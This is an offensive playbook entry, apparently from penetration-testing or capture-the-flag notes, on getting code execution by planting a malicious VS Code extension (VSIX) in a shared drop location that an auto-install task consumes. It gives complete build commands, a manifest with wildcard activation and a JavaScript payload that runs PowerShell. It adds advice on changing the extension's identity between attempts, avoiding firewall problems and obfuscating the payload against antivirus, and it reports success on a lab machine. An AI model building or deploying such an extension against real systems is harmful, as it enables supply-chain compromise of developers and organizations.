# VSIX Supply Chain Code Execution

## When to use

- Target has VS Code installed with automatic extension sync or install from a shared location
- Write access to a share, repository, or directory where VSIX files are consumed
- A scheduled task or service installs/updates extensions from the drop location
- Goal: code execution as the user running VS Code or the extension installer

## Tags

- ATT&CK: T1195.002 (Supply Chain Compromise: Software Supply Chain), T1059.001 (PowerShell)
- Platform: Windows, Linux, macOS
- Services: VS Code, extension management tasks
- Privileges: write access to extension drop location

## How it works

VS Code extensions (.vsix files) are ZIP archives containing a `package.json` manifest
and extension code (JavaScript/TypeScript). The `activationEvents` field controls when
the extension's `activate()` function runs. A malicious VSIX with `"*"` (all events)
activation runs code immediately when VS Code loads it.

When an organization deploys extensions via a shared location (file share, artifact
repo) and a task auto-installs them, uploading a malicious VSIX to that location
achieves code execution as whoever runs the installer.

## Building a malicious VSIX

```bash
# Install the VS Code extension CLI
npm install -g @vscode/vsce

# Create extension scaffold
mkdir evil-ext && cd evil-ext
cat > package.json << 'EOF'
{
  "name": "support-tools",
  "displayName": "Support Tools",
  "version": "1.0.0",
  "publisher": "internal",
  "engines": {"vscode": "^1.80.0"},
  "activationEvents": ["*"],
  "main": "./extension.js"
}
EOF

cat > extension.js << 'EOF'
const { exec } = require('child_process');
exports.activate = function() {
    // File-write payload (more reliable than reverse shell)
    exec('powershell -c "whoami > C:\\Users\\Public\\pwned.txt"');
};
EOF

vsce package
# Produces support-tools-1.0.0.vsix
```

## Operational notes

**Publisher+name must be unique.** VS Code won't reinstall an extension with the same
publisher and name. Use a different identity for each payload iteration.

**File-write over reverse shell.** If the target has uncertain firewall rules, write
results to a known-writable location (the same share you uploaded to) rather than
depending on outbound TCP. Check outbound connectivity separately.

**Activation timing.** Extensions activate when VS Code starts or when the activation
event fires. If a scheduled task runs `code --install-extension <path>`, the extension
activates in that VS Code instance. If VS Code isn't running, it activates on next
launch.

**Detection.** Extension installs are logged in VS Code's output panel and in
`~/.vscode/extensions/`. The VSIX itself may be scanned by AV (it's a ZIP with JS).
Obfuscation of the payload JS may be needed on defended targets.

## Proven on

- Windows Server 2025 DC (HTB Checkpoint, 2026-08-29): VSIX uploaded to DevDrop share, VSCodeExtSync task installed it as ryan.brooks, executed PowerShell to set dMSA attributes
